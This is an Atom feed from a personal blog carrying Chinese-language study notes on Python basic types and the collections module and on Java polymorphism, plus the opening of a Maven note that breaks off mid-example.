<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>blog</title>
  
  
  <link href="http://blog.le31ei.top/atom.xml" rel="self"/>
  
  <link href="http://blog.le31ei.top/"/>
  <updated>2021-08-16T12:06:54.358Z</updated>
  <id>http://blog.le31ei.top/</id>
  
  <author>
    <name>le31ei</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>python进阶之基础类型</title>
    <link href="http://blog.le31ei.top/2021/08/16/python%E8%BF%9B%E9%98%B6%E4%B9%8B%E5%9F%BA%E7%A1%80%E7%B1%BB%E5%9E%8B/"/>
    <id>http://blog.le31ei.top/2021/08/16/python%E8%BF%9B%E9%98%B6%E4%B9%8B%E5%9F%BA%E7%A1%80%E7%B1%BB%E5%9E%8B/</id>
    <published>2021-08-16T12:06:54.000Z</published>
    <updated>2021-08-16T12:06:54.358Z</updated>
    
    <content type="html"><![CDATA[<p>python一直在使用，但不太深入，现正好深入学习一下，参考的书籍是《python高级编程第2版》、《流畅的python》。这两本书一直想抽空读一遍，最近得空深入学习一下。后面一系列文档均是这些书的学习笔记。</p><h1 id="1-字符串与字节"><a href="#1-字符串与字节" class="headerlink" title="1. 字符串与字节"></a>1. 字符串与字节</h1><p>python3中所有的字符串均为unicode文本。即所有的字符串为str对象，str对象均由unicode字符组成。</p><p>而所有的字节对象前面需要加上<code>b</code>，表示该串字符序列为<code>bytes</code>。</p><p><strong>编码与解码</strong></p><p>以前在进行字符串与字节码转换时，经常搞不清楚到底该用encode还是decode。为方便记忆，我们可以将字节序列当成机器可读的存储字节，字符串想成人类可读的抽象的文本。把难读懂的机器码转换成抽象文本就是<code>解码</code>，将抽象文本换成机器存储的字节就是<code>编码</code>。</p><p>解码有两种方式：</p><ul><li>使用<code>str.decode(encoding, errors)</code>方法，对字节进行解码。encoding默认值为utf-8</li><li>使用<code>str(source, encoding, errors)</code>函数对字节码进行解码，创造一个新的字符串。</li></ul><p>编码的方式也同样有两种：</p><ul><li>使用<code>str.encode(encoding, errors)</code>方法，对字节进行编码。encoding默认值为utf-8</li><li>使用<code>bytes(source, encoding, errors)</code>函数对字符串进行编码。</li></ul><p>例如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>s = <span class="string">&#x27;∑çewqe&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">len</span>(s)</span><br><span class="line"><span class="number">6</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b = s.encode(<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">len</span>(b)</span><br><span class="line"><span class="number">9</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(b)</span><br><span class="line"><span class="string">b&#x27;\xe2\x88\x91\xc3\xa7ewqe&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">type</span>(b)</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">bytes</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; <span class="title">type</span>(<span class="params">s</span>)</span></span><br><span class="line"><span class="class">&lt;<span class="title">class</span> &#x27;<span class="title">str</span>&#x27;&gt;</span></span><br></pre></td></tr></table></figure><p><strong>不可变字符串及字节序列</strong></p><p>python的字符串是不可变的，字节序列也是不可变的。每当需要修改字符串时，生成的均是一个全新的字符串。</p><p>使用<code>+</code>拼接字符串生成的是一个新的字符串，可参考如下代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>s = <span class="string">&quot;test&quot;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">id</span>(s)</span><br><span class="line"><span class="number">4430539696</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s = s + <span class="string">&#x27;me&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(s)</span><br><span class="line">testme</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">id</span>(s)</span><br><span class="line"><span class="number">4429430640</span></span><br></pre></td></tr></table></figure><p>针对于字符串的拼接，如果用<code>+</code>在python中的速度会非常慢，所以python提供了一个<code>str.join()</code>方法。可以使用这个方法提高字符串拼接的速度，也可以在字符串之间更容易的插入分隔符</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>s = <span class="string">&quot;testme&quot;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s = <span class="string">&quot;&quot;</span>.join([<span class="string">&#x27;test&#x27;</span>, s])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(s)</span><br><span class="line">testtestme</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s = <span class="string">&quot;,&quot;</span>.join([<span class="string">&#x27;test&#x27;</span>, s])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(s)</span><br><span class="line">test,testtestme</span><br></pre></td></tr></table></figure><h1 id="2-集合类型"><a href="#2-集合类型" class="headerlink" title="2. 集合类型"></a>2. 集合类型</h1><p>python的集合类型一共包含以下几种类型：</p><ul><li>列表（list）</li><li>元组（tuple）</li><li>字段（dict）</li><li>集合（set）</li></ul><p>一般在工作中使用频率最高的还是列表和字段，set类型用于数据去重的时候，最为方便。</p><p><strong>元组（tuple）</strong></p><p>元组是不可变的，也是可哈希的。元组没有太多细节可说，一般用来存放不需要变化的数据，例如坐标。</p><p><strong>列表（list）</strong></p><p>list是一个可变序列，每个节点可以存放不同类型的元素。list中最为重要的一个概念就是列表推导式，是构成一个列表的最快捷的方法。</p><p><strong>列表推导式</strong></p><p>列表推导式可以直接使用列表的格式生成需要的列表，例如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>s = [x <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">10</span>) <span class="keyword">if</span> x % <span class="number">2</span> == <span class="number">0</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(s)</span><br><span class="line">[<span class="number">0</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">8</span>]</span><br></pre></td></tr></table></figure><p>在循环获取列表的时候，如果要获取列表下标可以采用以下的方法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> index, value <span class="keyword">in</span> <span class="built_in">enumerate</span>([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>]):</span><br><span class="line"><span class="meta">... </span>    print(index,value)</span><br><span class="line">...</span><br><span class="line"><span class="number">0</span> <span class="number">1</span></span><br><span class="line"><span class="number">1</span> <span class="number">2</span></span><br><span class="line"><span class="number">2</span> <span class="number">3</span></span><br><span class="line"><span class="number">3</span> <span class="number">4</span></span><br></pre></td></tr></table></figure><p><strong>字典</strong></p><p>字典也能进行字典推导式</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">s = &#123;num: num <span class="keyword">for</span> num <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">5</span>)&#125;</span><br><span class="line"></span><br><span class="line">print(s)</span><br><span class="line"></span><br><span class="line"><span class="comment"># output:</span></span><br><span class="line">  &#123;<span class="number">0</span>: <span class="number">0</span>, <span class="number">1</span>: <span class="number">1</span>, <span class="number">2</span>: <span class="number">2</span>, <span class="number">3</span>: <span class="number">3</span>, <span class="number">4</span>: <span class="number">4</span>&#125;</span><br></pre></td></tr></table></figure><p>在python3中，遍历字典返回的 keys()、values()、items()不再是列表，返回的是视图对象。</p><ul><li>keys()：返回dict_keys对象，可查看字典的所有键</li><li>values()：返回dict_values对象，可查看字典所有值</li><li>items(): 返回dict_item对象，可查看所有的(key, value)二元元组</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">s = &#123;<span class="string">&#x27;1&#x27;</span>: <span class="string">&#x27;test&#x27;</span>, <span class="string">&#x27;2&#x27;</span>: <span class="string">&#x27;test2&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">print(s.keys())</span><br><span class="line">print(s.values())</span><br><span class="line">print(s.items())</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s.keys():</span><br><span class="line">    print(i)</span><br><span class="line"></span><br><span class="line"><span class="comment"># output</span></span><br><span class="line">dict_keys([<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>])</span><br><span class="line">dict_values([<span class="string">&#x27;test&#x27;</span>, <span class="string">&#x27;test2&#x27;</span>])</span><br><span class="line">dict_items([(<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;test&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;test2&#x27;</span>)])</span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">2</span></span><br></pre></td></tr></table></figure><p><strong>集合</strong></p><p>set()是一种可变的、无序的、有限的集合，元素是唯一的，不可变的对象。</p><p>frozenset()是一种不可变的、无序的集合，元素是唯一的，不可变的对象。</p><p>集合也存在集合推导：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">s = &#123;x <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>)&#125;</span><br><span class="line">print(<span class="built_in">type</span>(s))</span><br><span class="line">print(s)</span><br><span class="line"></span><br><span class="line"><span class="comment"># output</span></span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">set</span>&#x27;&gt;</span></span><br><span class="line">&#123;0, 1, 2, 3, 4, 5, 6, 7, 8, 9&#125;</span><br></pre></td></tr></table></figure><p><strong>collection模块</strong></p><p>该模块是日常使用中作为基础类型的补充，也是使用比较频繁的数据结构。</p><p>常用的类型有：</p><ul><li>计数器（counter）</li><li>双向队列（deque）</li><li>默认字典（defaultdict）</li><li>有序字典（OrderedDict）</li><li>具名元组（namedtuple）</li></ul><p><strong>namedtuple</strong></p><p>主要用于定义一个简单的不变集合。如果使用类定义的话，显得太过臃肿。</p><p>例如可以定义一个点：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">p = (<span class="number">1</span>, <span class="number">2</span>)  <span class="comment"># 不太好明白意思</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> namedtuple</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Point = namedtuple(<span class="string">&#x27;Point&#x27;</span>, [<span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;y&#x27;</span>])</span><br><span class="line">p = Point(<span class="number">1</span>, <span class="number">2</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>p.x</span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>p.y</span><br><span class="line"><span class="number">2</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>deque</strong></p><p>list是常用的列表，循环遍历的时候很快，但数据量太大了之后，插入和删除效率会非常低。所以python提供了deque类型，双向列表。</p><p>deque可以实现非常高效的插入和删除操作，适用于队列和栈的数据类型。</p><p>deque默认的是栈的数据结构，使用最简单的pop是弹出队列末尾的数据，也就是先进后出，后进先出的栈的模式。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> collections <span class="keyword">import</span> deque</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>q = deque([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>q.pop()</span><br><span class="line"><span class="number">5</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>q.pop()</span><br><span class="line"><span class="number">4</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>q.append(<span class="number">1</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>q</span><br><span class="line">deque([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">1</span>])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>q.popleft()</span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>q</span><br><span class="line">deque([<span class="number">2</span>, <span class="number">3</span>, <span class="number">1</span>])</span><br></pre></td></tr></table></figure><p><strong>defaultdict</strong></p><p>使用dict如果key不存在会抛出<code>KeyError</code>的错误。而defaultdic就是解决这个问题的，在key不存在时，会返回一个默认值。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> collections <span class="keyword">import</span> defaultdict</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>d = defaultdict(<span class="keyword">lambda</span>: <span class="string">&#x27;None&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>d[<span class="string">&#x27;xxx&#x27;</span>]</span><br><span class="line"><span class="string">&#x27;None&#x27;</span></span><br></pre></td></tr></table></figure><p>另外两种数据结构也类似，用到的时候再查文档吧。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;python一直在使用，但不太深入，现正好深入学习一下，参考的书籍是《python高级编程第2版》、《流畅的python》。这两本书一直想抽空读一遍，最近得空深入学习一下。后面一系列文档均是这些书的学习笔记。&lt;/p&gt;
&lt;h1 id=&quot;1-字符串与字节&quot;&gt;&lt;a href=&quot;#</summary>
      
    
    
    
    <category term="Program" scheme="http://blog.le31ei.top/categories/Program/"/>
    
    
    <category term="python" scheme="http://blog.le31ei.top/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>java多态</title>
    <link href="http://blog.le31ei.top/2021/06/29/java%E5%A4%9A%E6%80%81/"/>
    <id>http://blog.le31ei.top/2021/06/29/java%E5%A4%9A%E6%80%81/</id>
    <published>2021-06-29T08:47:44.000Z</published>
    <updated>2021-06-29T08:47:44.968Z</updated>
    
    <content type="html"><![CDATA[<p>一直对面向对象中的多态模模糊糊，学了忘，忘了学。这次深入学习java，在此记录下，便于以后复习。</p><p>多态是面向对象编程语言中，与封装、继承并列为面向对象的三大特征。多态简单来说就是对象在编程时不确定具体的类型，而在运行时候才确定具体类型。</p><p>最简单的举例就是animal、cat、dog的故事。</p><p>定义animal父类如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Animal</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">shout</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;animal shout&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>定于Dog类如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Dog</span> <span class="keyword">extends</span> <span class="title">Animal</span></span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">shout</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;dog wang wang wang&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>定义Cat类如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Cat</span> <span class="keyword">extends</span> <span class="title">Animal</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">shout</span><span class="params">(String sound)</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;cat shout&quot;</span> + sound);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后调用几个类的代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Animal animal = <span class="keyword">new</span> Dog();</span><br><span class="line">        animal.shout();</span><br><span class="line">        Animal animal1 = <span class="keyword">new</span> Cat();</span><br><span class="line">        animal1.shout();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//运行结果</span></span><br><span class="line">dog wang wang wang</span><br><span class="line">animal shout</span><br></pre></td></tr></table></figure><p>我们定义了两个Animal类型的<code>animal</code>和<code>animal1</code>。分别指向Dog和Cat的类实例。由于Cat和Dog均是继承于Animal类的，所以该处会进行向上转型，会丢掉子类自己定义的方法，只能调用定义类型的父类中的方法。</p><p>所以定义的animal1实例，虽然指向Cat类的实例，但是由于向上转型，所以无法调用自己定义的重载带有参数的<code>public void shout(String sound)</code>方法。</p><p>而animal实例指向的是Dog类型，Dog类型中重写了父类的shout无参的方法，所以根据java的多态特性，可以在运行时确定对象的类型，所以animal实例能够指向自身的shout类，打印出<code>dog wang wang wang</code>。</p><p>所以对于多态可以有如下的总结：</p><p>向上转型的子类的实例对象，无法调用由于向上转型而丢失的子类方法。但是根据多态的特性，能够在运行时，调用子类中对于父类进行重写的方法。也就是能够在运行时确定调用的具体方法。</p><p>所以实现多态必须包含三个条件：继承、重写、向上转型。</p><p><strong>经典案例</strong></p><p>A类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">show</span><span class="params">(D obj)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;A and D&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">show</span><span class="params">(A obj)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;A and A&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>B类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">B</span> <span class="keyword">extends</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">show</span><span class="params">(B obj)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;B and B&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">show</span><span class="params">(A obj)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;B and A&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>C类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">C</span> <span class="keyword">extends</span> <span class="title">B</span></span>&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>D类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">D</span> <span class="keyword">extends</span>  <span class="title">B</span></span>&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Test类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        A a1 = <span class="keyword">new</span> A();</span><br><span class="line">        A a2 = <span class="keyword">new</span> B();</span><br><span class="line">        B b = <span class="keyword">new</span> B();</span><br><span class="line">        C c = <span class="keyword">new</span> C();</span><br><span class="line">        D d = <span class="keyword">new</span> D();</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;1 -- &quot;</span> + a1.show(b));  <span class="comment">// ==&gt; A and A</span></span><br><span class="line">        System.out.println(<span class="string">&quot;2 -- &quot;</span> + a1.show(c));  <span class="comment">// ==&gt; A and A</span></span><br><span class="line">        System.out.println(<span class="string">&quot;3 -- &quot;</span> + a1.show(d));  <span class="comment">// ==&gt; A and D</span></span><br><span class="line">        System.out.println(<span class="string">&quot;4 -- &quot;</span> + a2.show(b));  <span class="comment">// ==&gt; B and A</span></span><br><span class="line">        System.out.println(<span class="string">&quot;5 -- &quot;</span> + a2.show(c));  <span class="comment">// ==&gt; B and A</span></span><br><span class="line">        System.out.println(<span class="string">&quot;6 -- &quot;</span> + a2.show(d));  <span class="comment">// ==&gt; A and D</span></span><br><span class="line">        System.out.println(<span class="string">&quot;7 -- &quot;</span> + b.show(b));   <span class="comment">// ==&gt; B and B</span></span><br><span class="line">        System.out.println(<span class="string">&quot;8 -- &quot;</span> + b.show(c));   <span class="comment">// ==&gt; B and B</span></span><br><span class="line">        System.out.println(<span class="string">&quot;9 -- &quot;</span> + b.show(d));   <span class="comment">// ==&gt; A and D</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在看java多态的代码的时候，记住一个点，基类类型的对象，能够调用的方法包括基类本身的方法以及子类中重写的基类的方法。</p><p>对于以上代码的解释如下：</p><ol><li><code>a1.show(b)</code>：b的类型是b，所以对象b在a1调用的show方法上会发生向上转型，b的基类是A，所以只能调用A类中的<code>show(A obj)</code>方法。</li><li><code>a1.show(c)</code>：c的类型是c，所以这里也一样会发生向上转型，调用A类中的<code>show(A obj)</code>方法。</li><li><code>a1.show(d)</code>：因为A类中直接定义了<code>show(D obj)</code>方法，所以直接调用。</li><li><code>a2.show(b)</code>：a2的调用会发生多态。a2的show方法包含基类的show方法和B类型中重写的<code>show(A obj)</code>方法。所以a2的show一共有三个方法可以进行调用。<code>a2.show(b)</code>在这三种方法中没有对应的方法，所以b对象会发生向上转型，同时发生多态动态调用重写的方法。最后调用的是B类中的<code>show(A obj)</code></li><li><code>a2.show(c)</code>：该处c同样会发生向上转型以及多态，最后调用的仍然是B类中的<code>show(A obj)</code></li><li><code>a2.show(d)</code>：因为在基类A中直接定义了show(D obj)的方法，因此直接调用该方法。</li><li><code>b.show(b)</code>：b对象调用的方法包含基类A和本身B类的所有方法。所以该处直接调用<code>show(B obj)</code>方法</li><li><code>b.show(c)</code>：A和B类中均无对应的方法，所以c会发生向上转型，匹配到<code>show(B obj)</code>方法</li><li><code>b.show(d)</code>：A类中直接有对应的方法，直接调用<code>show(D obj)</code></li></ol><p>以上便是本次总结的关于java多态的相关知识，更多的知识可以参考《java编程思想》进一步学习。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;一直对面向对象中的多态模模糊糊，学了忘，忘了学。这次深入学习java，在此记录下，便于以后复习。&lt;/p&gt;
&lt;p&gt;多态是面向对象编程语言中，与封装、继承并列为面向对象的三大特征。多态简单来说就是对象在编程时不确定具体的类型，而在运行时候才确定具体类型。&lt;/p&gt;
&lt;p&gt;最简单的</summary>
      
    
    
    
    <category term="Program" scheme="http://blog.le31ei.top/categories/Program/"/>
    
    
    <category term="spring" scheme="http://blog.le31ei.top/tags/spring/"/>
    
  </entry>
  
  <entry>
    <title>maven学习笔记</title>
    <link href="http://blog.le31ei.top/2021/06/16/maven%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>http://blog.le31ei.top/2021/06/16/maven%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
    <published>2021-06-16T13:34:56.000Z</published>
    <updated>2021-06-16T13:34:56.612Z</updated>
    
    <content type="html"><![CDATA[<p>maven很久之前学过，但后面没搞java就基本忘了，基本的打包命令都忘得一干二净。最近准备深入学习下java，头一个要学的便是maven。在此记录下maven的学习笔记。</p><h1 id="1-maven介绍"><a href="#1-maven介绍" class="headerlink" title="1. maven介绍"></a>1. maven介绍</h1><p>maven主要用作java程序的打包，专门为java项目设计的管理和构建工具。</p><p>通过maven创建的项目结构大致如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">➜  maventest tree</span><br><span class="line">.</span><br><span class="line">├── pom.xml</span><br><span class="line">└── src</span><br><span class="line">    ├── main</span><br><span class="line">    │   ├── java</span><br><span class="line">    │   └── resources</span><br><span class="line">    └── test</span><br><span class="line">        └── java</span><br><span class="line"></span><br><span class="line">6 directories, 2 